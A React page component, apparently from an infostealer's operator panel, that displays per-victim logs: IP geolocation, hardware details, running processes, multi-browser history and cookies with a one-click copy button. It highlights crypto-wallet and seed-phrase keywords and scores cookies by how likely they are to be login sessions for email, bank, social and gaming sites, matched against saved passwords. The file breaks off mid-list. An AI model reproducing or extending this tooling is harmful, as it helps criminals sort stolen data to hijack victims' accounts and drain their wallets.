import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { useParams, Link } from 'react-router-dom';
import {
    Box,
    Typography,
    Paper,
    CircularProgress,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Table,
    TableBody,
    TableCell,
    TableContainer,
    TableHead,
    TableRow,
    Button,
    Chip,
    TextField,
    IconButton,
    Tooltip,
} from '@mui/material';
import ContentCopyIcon from '@mui/icons-material/ContentCopy';
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';

const CRYPTO_KEYWORDS = [
    'crypto', 'bitcoin', 'CHAIN', 'WALLET', 'RIPPLE', 'LITECOIN', 'ETH', 'TRON', 'TRX', 'XRP', 'XLM', 'ADA', 'DOGE', 'SHIB', 'SOL',
    'exodus', 'electrum', 'ledger', 'TREZOR', 'coinbase', 'metamask', 'binance', 'token', 'bnb', 'erc20', 'bep20',
    'wallet', 'private key', 'seed phrase', 'mnemonic', 'blockchain', 'web3', 'defi', 'nft', 'opensea',
    'binance.us', 'coinbase.com', 'kraken.com', 'phantom.app', 'trustwallet', 'safemoon', 'pancakeswap'
];

const isImportant = (text) => {
    if (!text) return false;
    const lowerText = String(text).toLowerCase();
    return CRYPTO_KEYWORDS.some(keyword => lowerText.includes(keyword));
};


const DataSection = ({ title, data, renderFunction }) => (
    <Accordion 
        defaultExpanded={false}
        TransitionProps={{ timeout: 0 }}
        sx={{
            '& .MuiCollapse-root': {
                transition: 'none !important',
            },
            '& .MuiCollapse-entered': {
                transition: 'none !important',
            },
        }}
    >
        <AccordionSummary expandIcon={<ExpandMoreIcon />}>
            <Typography variant="h6">{title}</Typography>
        </AccordionSummary>
        <AccordionDetails>
            {renderFunction(data)}
        </AccordionDetails>
    </Accordion>
);

const LogDetailPage = () => {
    const { logId } = useParams();
    const [logData, setLogData] = useState(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [searchQuery, setSearchQuery] = useState('');
    const [debouncedSearchQuery, setDebouncedSearchQuery] = useState('');

    // Debounce search query to reduce lag
    useEffect(() => {
        const timer = setTimeout(() => {
            setDebouncedSearchQuery(searchQuery);
        }, 300); // 300ms delay

        return () => clearTimeout(timer);
    }, [searchQuery]);

    const fetchLogData = useCallback(async () => {
        try {
            setLoading(true);
            // This is a placeholder endpoint. Replace with your actual API endpoint.
            const response = await fetch(`/api/logs/${logId}`);
            if (!response.ok) {
                throw new Error(`Server responded with status: ${response.status}`);
            }
            const data = await response.json();
            setLogData(data);
            setError(null);
        } catch (err) {
            console.error(`Failed to fetch log ${logId}:`, err);
            setError(`Error fetching log details: ${err.message}`);
        } finally {
            setLoading(false);
        }
    }, [logId]);

    useEffect(() => {
        fetchLogData();
    }, [fetchLogData]);

    const renderSimpleTable = (data, highlight = false, isHistory = false) => {
        if (!data || data.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No data available.</Typography>;
        }
        
        let dataArray = Array.isArray(data) ? data : [data];
        
        // Filter data based on search query (optimized)
        let filteredDataArray = dataArray;
        if (debouncedSearchQuery) {
            filteredDataArray = dataArray.filter(row => {
                return Object.values(row).some(value => matchesSearch(value));
            });
        }

        if (filteredDataArray.length === 0 && debouncedSearchQuery) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No data matches your search query.</Typography>;
        }

        const headers = Object.keys(filteredDataArray[0] || {});

        return (
            <TableContainer component={Paper} sx={{ backgroundColor: '#252b3b', border: '1px solid #334155', borderRadius: '12px', overflow: 'hidden' }}>
                <Table size="small">
                    <TableHead>
                        <TableRow>
                            {headers.map(key => (
                                <TableCell key={key} sx={{ color: '#4ade80', fontWeight: 600 }}>
                                    {key.toUpperCase()}
                                </TableCell>
                            ))}
                        </TableRow>
                    </TableHead>
                    <TableBody>
                        {filteredDataArray.map((row, index) => (
                            <TableRow key={index} sx={{
                                backgroundColor: highlight && isImportant(Object.values(row).join(' ')) 
                                    ? 'rgba(74, 222, 128, 0.1)' 
                                    : 'inherit',
                                '&:hover': {
                                    backgroundColor: 'rgba(255, 255, 255, 0.03)',
                                }
                            }}>
                                {headers.map(key => (
                                    <TableCell key={key} sx={{ color: '#e2e8f0' }}>
                                        {isHistory && key === 'url' ? (
                                            <a 
                                                href={row[key]} 
                                                target="_blank" 
                                                rel="noopener noreferrer"
                                                style={{ color: '#4ade80', textDecoration: 'none' }}
                                            >
                                                {row[key]}
                                            </a>
                                        ) : (
                                            String(row[key])
                                        )}
                                    </TableCell>
                                ))}
                            </TableRow>
                        ))}
                    </TableBody>
                </Table>
            </TableContainer>
        );
    };

    const renderProcessesTable = (processes) => {
        if (!processes || processes.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No running processes found.</Typography>;
        }

        // Filter processes based on search quer (optimized)
        let filteredProcesses = processes;
        if (debouncedSearchQuery) {
            filteredProcesses = processes.filter(proc => 
                matchesSearch(proc.imageName) || 
                matchesSearch(proc.pid) || 
                matchesSearch(proc.sessionName) ||
                matchesSearch(proc.memUsage)
            );
        }

        if (filteredProcesses.length === 0 && debouncedSearchQuery) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No processes match your search query.</Typography>;
        }

        return (
            <TableContainer component={Paper} sx={{ backgroundColor: '#252b3b', border: '1px solid #334155', borderRadius: '12px', overflow: 'hidden' }}>
                <Table size="small">
                    <TableHead>
                        <TableRow>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Image Name</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>PID</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Session Name</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Session#</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Mem Usage</TableCell>
                        </TableRow>
                    </TableHead>
                    <TableBody>
                        {filteredProcesses.map((proc, index) => (
                            <TableRow key={index} sx={{
                                backgroundColor: isImportant(proc.imageName) || isImportant(proc.memUsage) 
                                    ? 'rgba(74, 222, 128, 0.1)' 
                                    : 'inherit',
                                '&:hover': {
                                    backgroundColor: 'rgba(255, 255, 255, 0.03)',
                                }
                            }}>
                                <TableCell sx={{ color: '#e2e8f0' }}>{proc.imageName}</TableCell>
                                <TableCell sx={{ color: '#e2e8f0' }}>{proc.pid}</TableCell>
                                <TableCell sx={{ color: '#e2e8f0' }}>{proc.sessionName}</TableCell>
                                <TableCell sx={{ color: '#e2e8f0' }}>{proc.sessionNum}</TableCell>
                                <TableCell sx={{ color: '#e2e8f0' }}>{proc.memUsage}</TableCell>
                            </TableRow>
                        ))}
                    </TableBody>
                </Table>
            </TableContainer>
        );
    };

    const renderPCInformation = (pcData) => {
        if (!pcData) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No PC data available.</Typography>;
        }

        // Check if PC information matches search query (optimized)
        let shouldShowSection = true;
        if (debouncedSearchQuery) {
            shouldShowSection = matchesSearch(pcData.screenSize) ||
                matchesSearch(pcData.dateTime) ||
                matchesSearch(pcData.ipAddress) ||
                (pcData.location && (
                    matchesSearch(pcData.location.countryName) ||
                    matchesSearch(pcData.location.cityName) ||
                    matchesSearch(pcData.location.latitude) ||
                    matchesSearch(pcData.location.longitude) ||
                    matchesSearch(pcData.location.ipAddress)
                )) ||
                (pcData.systemInfo && (
                    (pcData.systemInfo.cpu && (
                        matchesSearch(pcData.systemInfo.cpu.name) ||
                        matchesSearch(pcData.systemInfo.cpu.architecture) ||
                        matchesSearch(pcData.systemInfo.cpu.maxClockSpeed)
                    )) ||
                    (pcData.systemInfo.gpu && pcData.systemInfo.gpu.some(gpu => 
                        matchesSearch(gpu.name) || matchesSearch(gpu.driverVersion) || matchesSearch(gpu.memory)
                    )) ||
                    matchesSearch(pcData.systemInfo.ram) ||
                    matchesSearch(pcData.systemInfo.os)
                ));
        }

        if (!shouldShowSection && debouncedSearchQuery) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No PC information matches your search query.</Typography>;
        }

        console.log('renderPCInformation - pcData:', pcData);
        console.log('renderPCInformation - screenSize:', pcData.screenSize);
        console.log('renderPCInformation - dateTime:', pcData.dateTime);
        console.log('renderPCInformation - ipAddress:', pcData.ipAddress);
        console.log('renderPCInformation - location:', pcData.location);

        const info = [];
        
        // Always add basic info if available
        if (pcData.screenSize) {
            info.push({ label: 'Screen Resolution', value: pcData.screenSize });
        }
        if (pcData.dateTime) {
            info.push({ label: 'Date/Time', value: pcData.dateTime });
        }
        if (pcData.ipAddress) {
            info.push({ label: 'IP Address', value: pcData.ipAddress });
        }

        // Add location info if available
        const location = pcData.location;
        if (location) {
            if (location.countryName) {
                info.push({ label: 'Country', value: location.countryName });
            }
            if (location.cityName) {
                info.push({ label: 'City', value: location.cityName });
            }
            if (location.latitude !== undefined && location.latitude !== null) {
                info.push({ label: 'Latitude', value: location.latitude.toString() });
            }
            if (location.longitude !== undefined && location.longitude !== null) {
                info.push({ label: 'Longitude', value: location.longitude.toString() });
            }
            if (location.ipAddress) {
                info.push({ label: 'Location IP', value: location.ipAddress });
            }
        }

        // Add system info if available
        const systemInfo = pcData.systemInfo;
        if (systemInfo) {
            // CPU Info
            if (systemInfo.cpu) {
                info.push({ label: 'CPU', value: systemInfo.cpu.name });
                if (systemInfo.cpu.cores > 0) {
                    info.push({ label: 'CPU Cores', value: `${systemInfo.cpu.cores} cores, ${systemInfo.cpu.threads} threads` });
                }
                if (systemInfo.cpu.maxClockSpeed !== 'Unknown') {
                    info.push({ label: 'CPU Clock Speed', value: systemInfo.cpu.maxClockSpeed });
                }
                if (systemInfo.cpu.architecture) {
                    info.push({ label: 'CPU Architecture', value: systemInfo.cpu.architecture });
                }
            }
            
            // GPU Info
            if (systemInfo.gpu && systemInfo.gpu.length > 0) {
                systemInfo.gpu.forEach((gpu, index) => {
                    if (index === 0) {
                        info.push({ label: 'GPU', value: gpu.name });
                    } else {
                        info.push({ label: `GPU ${index + 1}`, value: gpu.name });
                    }
                    if (gpu.driverVersion) {
                        info.push({ label: index === 0 ? 'GPU Driver' : `GPU ${index + 1} Driver`, value: gpu.driverVersion });
                    }
                    if (gpu.memory) {
                        info.push({ label: index === 0 ? 'GPU Memory' : `GPU ${index + 1} Memory`, value: gpu.memory });
                    }
                });
            }
            
            // RAM Info
            if (systemInfo.ram) {
                info.push({ label: 'Total RAM', value: systemInfo.ram });
            }
            
            // OS Info
            if (systemInfo.os) {
                info.push({ label: 'Operating System', value: systemInfo.os });
            }
        }

        if (info.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No PC information available.</Typography>;
        }

        return (
            <TableContainer component={Paper} sx={{ backgroundColor: '#252b3b', border: '1px solid #334155', borderRadius: '12px', overflow: 'hidden' }}>
                <Table size="small">
                    <TableHead>
                        <TableRow>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Property</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Value</TableCell>
                        </TableRow>
                    </TableHead>
                    <TableBody>
                        {info.map((item, index) => (
                            <TableRow key={index} sx={{
                                '&:hover': {
                                    backgroundColor: 'rgba(255, 255, 255, 0.03)',
                                }
                            }}>
                                <TableCell sx={{ color: '#e2e8f0', fontWeight: 500 }}><strong>{item.label}</strong></TableCell>
                                <TableCell sx={{ color: '#94a3b8' }}>{item.value}</TableCell>
                            </TableRow>
                        ))}
                    </TableBody>
                </Table>
            </TableContainer>
        );
    };

    const renderBrowserHistory = (browserHistory) => {
        console.log('renderBrowserHistory - input:', browserHistory);
        console.log('renderBrowserHistory - type:', typeof browserHistory);
        
        if (!browserHistory) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No browser history data available.</Typography>;
        }

        // Handle case where browserHistory might be a string or incorrectly formatted
        let parsedHistory = browserHistory;
        if (typeof browserHistory === 'string') {
            try {
                parsedHistory = JSON.parse(browserHistory);
                console.log('renderBrowserHistory - parsed from string:', parsedHistory);
            } catch (e) {
                console.error('renderBrowserHistory - parse error:', e);
                return (
                    <Box>
                        <Typography sx={{ p: 2, color: 'error' }}>Invalid browser history data format.</Typography>
                        <Typography sx={{ p: 2, fontSize: '0.8em' }}>Raw data: {browserHistory.substring(0, 200)}...</Typography>
                    </Box>
                );
            }
        }

        // Handle case where it might be an array instead of an object
        if (Array.isArray(parsedHistory)) {
            console.log('renderBrowserHistory - is array, converting to object');
            // If it's an array, try to use it as Chrome history
            parsedHistory = { chromeHistory: parsedHistory };
        }

        console.log('renderBrowserHistory - final parsedHistory:', parsedHistory);

        let browsers = [
            { name: 'Chrome', data: Array.isArray(parsedHistory.chromeHistory) ? parsedHistory.chromeHistory : [] },
            { name: 'Firefox', data: Array.isArray(parsedHistory.firefoxHistory) ? parsedHistory.firefoxHistory : [] },
            { name: 'Edge', data: Array.isArray(parsedHistory.edgeHistory) ? parsedHistory.edgeHistory : [] },
            { name: 'Opera', data: Array.isArray(parsedHistory.operaHistory) ? parsedHistory.operaHistory : [] },
            { name: 'Brave', data: Array.isArray(parsedHistory.braveHistory) ? parsedHistory.braveHistory : [] },
        ];

        // Filter browser history based on search query (optimized)
        let filteredBrowsers = browsers;
        if (debouncedSearchQuery) {
            filteredBrowsers = browsers.map(browser => ({
                ...browser,
                data: browser.data.filter(entry => 
                    matchesSearch(entry.url) || matchesSearch(entry.title)
                )
            }));
        }

        const totalEntries = filteredBrowsers.reduce((sum, browser) => sum + (Array.isArray(browser.data) ? browser.data.length : 0), 0);

        if (totalEntries === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No browser history entries found.</Typography>;
        }

        return (
            <Box>
                {filteredBrowsers.map((browser, browserIndex) => {
                    if (!Array.isArray(browser.data) || browser.data.length === 0) {
                        return null;
                    }

                    return (
                        <Box key={browserIndex} sx={{ mb: 3 }}>
                            <Typography variant="subtitle1" sx={{ mb: 1, fontWeight: 'bold', color: '#4ade80' }}>
                                {browser.name} ({browser.data.length} entries)
                            </Typography>
                            <TableContainer component={Paper} sx={{ backgroundColor: '#252b3b', border: '1px solid #334155', borderRadius: '12px', overflow: 'hidden' }}>
                                <Table size="small">
                                    <TableHead>
                                        <TableRow>
                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>URL</TableCell>
                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Title</TableCell>
                                        </TableRow>
                                    </TableHead>
                                    <TableBody>
                                        {browser.data.map((entry, index) => {
                                            // Handle entry being an object or a string
                                            let url = '';
                                            let title = '';
                                            
                                            if (typeof entry === 'object' && entry !== null) {
                                                url = entry.url || '';
                                                title = entry.title || '';
                                            } else if (typeof entry === 'string') {
                                                // Try to parse if it's a JSON string
                                                try {
                                                    const parsed = JSON.parse(entry);
                                                    url = parsed.url || '';
                                                    title = parsed.title || '';
                                                } catch (e) {
                                                    url = entry;
                                                }
                                            }

                                            const entryText = `${url} ${title}`;
                                            return (
                                                <TableRow key={index} sx={{
                                                    backgroundColor: isImportant(entryText) 
                                                        ? 'rgba(74, 222, 128, 0.1)' 
                                                        : 'inherit',
                                                    '&:hover': {
                                                        backgroundColor: 'rgba(255, 255, 255, 0.03)',
                                                    }
                                                }}>
                                                    <TableCell sx={{ color: '#e2e8f0' }}>
                                                        {url && url !== 'N/A' ? (
                                                            <a 
                                                                href={url} 
                                                                target="_blank" 
                                                                rel="noopener noreferrer" 
                                                                style={{ 
                                                                    wordBreak: 'break-all',
                                                                    color: '#4ade80',
                                                                    textDecoration: 'none'
                                                                }}
                                                            >
                                                                {url}
                                                            </a>
                                                        ) : (
                                                            <span style={{ color: '#94a3b8' }}>{url || 'N/A'}</span>
                                                        )}
                                                    </TableCell>
                                                    <TableCell sx={{ color: '#94a3b8' }}>{title || 'N/A'}</TableCell>
                                                </TableRow>
                                            );
                                        })}
                                    </TableBody>
                                </Table>
                            </TableContainer>
                        </Box>
                    );
                })}
            </Box>
        );
    };

    // Helper function to filter data based on search query (memoized query)
    const queryLower = useMemo(() => debouncedSearchQuery.toLowerCase(), [debouncedSearchQuery]);
    const matchesSearch = useCallback((text) => {
        if (!debouncedSearchQuery) return true;
        const searchText = String(text || '').toLowerCase();
        return searchText.includes(queryLower);
    }, [debouncedSearchQuery, queryLower]);

    // Helper function to copy text to clipboard
    const copyToClipboard = async (text) => {
        try {
            // Try modern Clipboard API first
            if (navigator.clipboard && navigator.clipboard.writeText) {
                await navigator.clipboard.writeText(text);
                return;
            }
            
            // Fallback to older method for browsers/contexts without Clipboard API
            const textArea = document.createElement('textarea');
            textArea.value = text;
            textArea.style.position = 'fixed';
            textArea.style.left = '-999999px';
            textArea.style.top = '-999999px';
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            
            try {
                const successful = document.execCommand('copy');
                if (!successful) {
                    throw new Error('execCommand copy failed');
                }
            } finally {
                document.body.removeChild(textArea);
            }
        } catch (err) {
            console.error('Failed to copy:', err);
        }
    };

    // Helper function to render a cookie table
    const renderCookieTableContent = (cookieList) => {
        if (!cookieList || cookieList.length === 0) {
            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No cookies found.</Typography>;
        }

        return (
            <TableContainer 
                component={Paper} 
                sx={{ 
                    backgroundColor: '#252b3b', 
                    border: '1px solid #334155',
                    borderRadius: '12px',
                    overflow: 'hidden',
                }}
            >
                <Table size="small" sx={{ '& .MuiTableCell-root': { py: 0.5, px: 1 } }}>
                    <TableHead>
                        <TableRow>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600, py: 1 }}>Host</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600, py: 1 }}>Name</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600, py: 1 }}>Path</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600, py: 1 }}>Value</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600, py: 1 }}>Expires</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600, py: 1 }}>Secure</TableCell>
                            <TableCell sx={{ color: '#4ade80', fontWeight: 600, py: 1 }}>HttpOnly</TableCell>
                        </TableRow>
                    </TableHead>
                    <TableBody>
                        {cookieList.map((cookie, index) => {
                            const cookieText = `${cookie.host || cookie.domain || ''} ${cookie.name || ''} ${cookie.value || ''}`;
                            const expirationInfo = cookie.expirationInfo;
                            
                            return (
                                <TableRow key={index} sx={{
                                    backgroundColor: isImportant(cookieText) 
                                        ? 'rgba(74, 222, 128, 0.1)' 
                                        : cookie.expirationInfo.isExpired
                                            ? 'rgba(239, 68, 68, 0.05)'
                                            : 'inherit',
                                    opacity: cookie.expirationInfo.isExpired ? 0.7 : 1,
                                    '&:hover': {
                                        backgroundColor: 'rgba(255, 255, 255, 0.03)',
                                    },
                                    '& .MuiTableCell-root': {
                                        py: 0.5,
                                        lineHeight: 1.3,
                                    }
                                }}>
                                    <TableCell sx={{ color: '#e2e8f0', wordBreak: 'break-all', maxHeight: '40px', overflow: 'hidden' }}>
                                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5, flexWrap: 'wrap' }}>
                                            <span>{cookie.host || cookie.domain || 'N/A'}</span>
                                            {cookie.browser && <Chip label={cookie.browser} size="small" sx={{ height: '16px', fontSize: '0.6rem', backgroundColor: '#334155', color: '#94a3b8' }} />}
                                        </Box>
                                    </TableCell>
                                    <TableCell sx={{ color: '#e2e8f0', maxHeight: '40px', overflow: 'hidden' }}>{cookie.name || 'N/A'}</TableCell>
                                    <TableCell sx={{ color: '#94a3b8', maxHeight: '40px', overflow: 'hidden' }}>{cookie.path || 'N/A'}</TableCell>
                                    <TableCell sx={{ 
                                        color: '#94a3b8', 
                                        wordBreak: 'break-all', 
                                        maxWidth: '300px',
                                        maxHeight: '40px',
                                        overflow: 'hidden',
                                        textOverflow: 'ellipsis',
                                        display: '-webkit-box',
                                        WebkitLineClamp: 2,
                                        WebkitBoxOrient: 'vertical'
                                    }}>
                                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
                                            <Box sx={{ 
                                                flex: 1,
                                                overflow: 'hidden',
                                                textOverflow: 'ellipsis',
                                                display: '-webkit-box',
                                                WebkitLineClamp: 2,
                                                WebkitBoxOrient: 'vertical'
                                            }}>
                                                {cookie.value || 'N/A'}
                                            </Box>
                                            {cookie.value && (
                                                <Tooltip title="Copy cookie value" arrow>
                                                    <IconButton
                                                        size="small"
                                                        onClick={() => copyToClipboard(cookie.value)}
                                                        sx={{ 
                                                            color: '#94a3b8',
                                                            flexShrink: 0,
                                                            '&:hover': {
                                                                color: '#4ade80',
                                                                backgroundColor: 'rgba(74, 222, 128, 0.1)'
                                                            }
                                                        }}
                                                    >
                                                        <ContentCopyIcon fontSize="small" />
                                                    </IconButton>
                                                </Tooltip>
                                            )}
                                        </Box>
                                    </TableCell>
                                    <TableCell sx={{ 
                                        color: cookie.expirationInfo.isExpired ? '#ef4444' : '#4ade80',
                                        fontWeight: cookie.expirationInfo.isExpired ? 400 : 500,
                                        maxHeight: '40px',
                                        overflow: 'hidden'
                                    }}>
                                        {expirationInfo.dateString}
                                    </TableCell>
                                    <TableCell sx={{ color: (cookie.secure || cookie.isSecure) ? '#4ade80' : '#94a3b8', maxHeight: '40px' }}>
                                        {(cookie.secure || cookie.isSecure) ? 'Yes' : 'No'}
                                    </TableCell>
                                    <TableCell sx={{ color: (cookie.httpOnly || cookie.isHttpOnly) ? '#4ade80' : '#94a3b8', maxHeight: '40px' }}>
                                        {(cookie.httpOnly || cookie.isHttpOnly) ? 'Yes' : 'No'}
                                    </TableCell>
                                </TableRow>
                            );
                        })}
                    </TableBody>
                </Table>
            </TableContainer>
        );
    };

    // Helper function to parse expiration date and check if expired
    // Handles different browser formats: Chrome (Windows FILETIME 100-nanosecond intervals), Firefox (Unix timestamp seconds), etc.
    const parseExpiration = (cookie) => {
        // Try different expiration field names
        let expires = cookie.expires || cookie.expires_utc || cookie.expirationDate || cookie.expiry;
        
        if (!expires || expires === 0) {
            return { date: null, isExpired: false, dateString: 'Session Cookie' };
        }
        
            try {
                let expiresDate;
            
            // Check if it's a Unix timestamp (seconds) - Firefox format
            if (expires < 1000000000000) {
                // Unix timestamp in seconds - convert to milliseconds
                expiresDate = new Date(expires * 1000);
            } 
            // Check if it's a Unix timestamp (milliseconds) - some browsers
            else if (expires < 1000000000000000) {
                // Unix timestamp in milliseconds
                expiresDate = new Date(expires);
            }
            // Chrome format: microseconds since Windows FILETIME epoch (Jan 1, 1601)
            else {
                const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
                // Convert microseconds to milliseconds (divide by 1000), then subtract epoch difference
                const expiresMs = (expires / 1000) - WINDOWS_EPOCH_DIFF_MS;
                expiresDate = new Date(expiresMs);
            }
            
            // Validate the date is reasonable
            if (isNaN(expiresDate.getTime())) {
                console.warn('Invalid expiration date from expires:', expires);
                return { date: null, isExpired: false, dateString: `Invalid (${expires})` };
            }
            
            const now = new Date();
            const isExpired = expiresDate < now;
            
            return {
                date: expiresDate,
                isExpired: isExpired,
                dateString: expiresDate.toLocaleString()
            };
        } catch (e) {
            console.error('Error parsing expiration:', e, 'expires value:', expires);
            return { date: null, isExpired: false, dateString: `Error: ${expires}` };
        }
    };

    // Helper function to calculate entropy (randomness) of a string
    // High entropy suggests random tokens/session IDs
    const calculateEntropy = (str) => {
        if (!str || str.length === 0) return 0;
        const freq = {};
        for (let i = 0; i < str.length; i++) {
            const char = str[i];
            freq[char] = (freq[char] || 0) + 1;
        }
        let entropy = 0;
        for (const count of Object.values(freq)) {
            const p = count / str.length;
            entropy -= p * Math.log2(p);
        }
        return entropy;
    };

    // Helper function to check if domain has saved passwords (correlation)
    const hasSavedPasswordForDomain = (domain, savedPasswords) => {
        if (!savedPasswords || !Array.isArray(savedPasswords)) return false;
        const domainLower = domain.toLowerCase();
        return savedPasswords.some(pwd => {
            if (!pwd.origin) return false;
            try {
                const url = new URL(pwd.origin);
                return url.hostname.toLowerCase().includes(domainLower) || 
                       domainLower.includes(url.hostname.toLowerCase());
            } catch (e) {
                // If URL parsing fails, do simple string matching
                return pwd.origin.toLowerCase().includes(domainLower) ||
                       domainLower.includes(pwd.origin.toLowerCase());
            }
        });
    };

    // Helper function to detect if a cookie is a login/authentication cookie
    // Uses multiple heuristics to determine likelihood
    const isLoginCookie = (cookie, savedPasswords = null) => {
        const cookieName = (cookie.name || '').toLowerCase();
        const cookieHost = ((cookie.host || cookie.domain || '')).toLowerCase();
        const cookiePath = (cookie.path || '').toLowerCase();
        const cookieValue = (cookie.value || '');
        
        let score = 0;
        const THRESHOLD = 2; // Minimum score to be considered a login cookie
        
        // 1. Cookie name patterns (strong signal)
        const loginPatterns = [
            // Session IDs
            'session', 'sessionid', 'session_id', 'sessid', 'sess', 'ses', 'sid',
            // Auth tokens
            'auth', 'token', 'access', 'refresh', 'jwt', 'bearer', 'oauth',
            // Login-related
            'login', 'logged', 'loggedin', 'loginstatus',
            // Identity/SSO
            'sso', 'identity', 'credential', 'authentication', 'authorization',
            // CSRF protection (often on login pages)
            'csrf', 'xsrf', 'csrftoken', 'xsrftoken',
            // Remember me
            'remember', 'rememberme', 'remember_me', 'remember-me',
            // User identifiers
            'userid', 'user_id', 'username', 'user', 'uid',
            // API keys
            'apikey', 'api_key', 'apisecret', 'api_secret', 'secret',
            // Other common patterns
            'passwd', 'password', 'pwd', 'pass',
            // Platform-specific
            'aws-session', 'aws-sig', 'cloudfront-signature',
            'laravel_session', 'django_session', 'phpsessid', 'jsessionid',
            'asp.net_sessionid', 'cfid', 'cftoken',
            // Framework & middleware
            'connect.sid', 'session_key', 'session_token', 'auth_token',
            'remember_token', 'user_session',
            // OAuth / OIDC / federation
            'idtoken', 'id_token', 'accesstoken', 'access_token',
            'refreshtoken', 'refresh_token', 'state', 'nonce', 'sub',
            // Account / identity state
            'account', 'acct', 'profile', 'principal', 'identity_id',
            // Persistent / keep-alive semantics
            'keepalive', 'stayloggedin', 'persist', 'persistent',
            // Load balancer / edge session affinity
            'route', 'sticky', 'affinity', 'balancer', 'lb',
            // SPA / API auth context
            'clientid', 'client_id', 'scope', 'roles', 'permissions'
        ];
        
        // Check for prefix patterns first (browser-enforced auth prefixes)
        const prefixPatterns = ['__host-', '__secure-'];
        const hasPrefix = prefixPatterns.some(prefix => cookieName.startsWith(prefix));
        
        // Check for other patterns
        const nameMatches = loginPatterns.some(pattern => cookieName.includes(pattern));
        
        if (hasPrefix || nameMatches) score += 2;
        
        // High entropy values (random-looking strings) suggest tokens/session IDs
        if (cookieValue.length > 20) {
            const entropy = calculateEntropy(cookieValue);
            if (entropy > 4.0) { // High entropy threshold
                score += 1;
            }
        }
        
        // 2. Domain reputation (account-based services, email, social, cloud)
        const authDomains = [
            // Authentication services
            'auth', 'login', 'account', 'identity', 'sso', 'oauth', 'signin', 'sign-in',
            // Email providers
            'gmail.com', 'outlook.com', 'yahoo.com', 'protonmail.com', 'mail.com',
            // Social networks
            'discord.com', 'github.com', 'facebook.com', 'twitter.com', 'x.com',
            'instagram.com', 'linkedin.com', 'reddit.com', 'tiktok.com', 'snapchat.com',
            // Cloud/Enterprise
            'google.com', 'microsoft.com', 'apple.com', 'amazon.com', 'aws.amazon.com',
            'azure.com', 'cloudflare.com', 'okta.com', 'auth0.com',
            // E-commerce/Payment
            'paypal.com', 'stripe.com', 'shopify.com', 'ebay.com',
            // Gaming
            'steamcommunity.com', 'steampowered.com', 'epicgames.com', 'xbox.com',
            'playstation.com', 'nintendo.com', 'battle.net', 'riotgames.com',
            // Streaming
            'netflix.com', 'spotify.com', 'hulu.com', 'disney.com', 'hbo.com',
            // Development/Code
            'gitlab.com', 'bitbucket.org', 'stackoverflow.com',
            // Banking/Financial (be careful with these)
            'bank', 'banking', 'chase.com', 'wellsfargo.com', 'bankofamerica.com',
            // Other common services
            'dropbox.com', 'onedrive.com', 'icloud.com', 'notion.so', 'slack.com',
            'zoom.us', 'teams.microsoft.com'
        ];
        
        const domainMatches = authDomains.some(domain => cookieHost.includes(domain));
        if (domainMatches) score += 2;
        
        // 3. Flags that imply authentication
        const isHttpOnly = (cookie.httpOnly || cookie.isHttpOnly) === true;
        const isSecure = (cookie.secure || cookie.isSecure) === true;
        const sameSite = (cookie.sameSite || cookie.same_site || '').toLowerCase();
        
        if (isHttpOnly) score += 1; // HttpOnly is common for session cookies
        if (isSecure) score += 0.5; // Secure flag is good practice
        if (sameSite === 'none') score += 0.5; // Often used for cross-domain auth
        
        // 4. Expiration behavior
        const expires = cookie.expires || cookie.expires_utc || cookie.expirationDate || cookie.expiry;
        const isSessionCookie = !expires || expires === 0;
        
        if (isSessionCookie && isHttpOnly) {
            score += 1.5; // Session cookies with HttpOnly are very likely auth
        } else if (isSessionCookie) {
            score += 0.5; // Session cookies without HttpOnly are less certain
        } else if (expires) {
            // Check if it's a "remember me" token (long-lived, 30+ days)
            try {
                let expiresDate;
                    if (expires < 1000000000000) {
                        // Unix timestamp in seconds
                        expiresDate = new Date(expires * 1000);
                    } else if (expires < 1000000000000000) {
                        // Unix timestamp in milliseconds
                        expiresDate = new Date(expires);
                    } else {
                        // Chrome format: microseconds since Windows FILETIME epoch
                        const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
                        expiresDate = new Date((expires / 1000) - WINDOWS_EPOCH_DIFF_MS);
                    }
                if (!isNaN(expiresDate.getTime())) {
                    const daysUntilExpiry = (expiresDate.getTime() - Date.now()) / (1000 * 60 * 60 * 24);
                    if (daysUntilExpiry > 30) {
                        score += 0.5; // Long-lived cookies might be "remember me" tokens
                    }
                }
            } catch (e) {
                // Ignore parsing errors
            }
        }
        
        // 5. Path and scope (auth-related paths)
        const authPaths = [
            '/account', '/auth', '/login', '/signin', '/sign-in', '/api/auth',
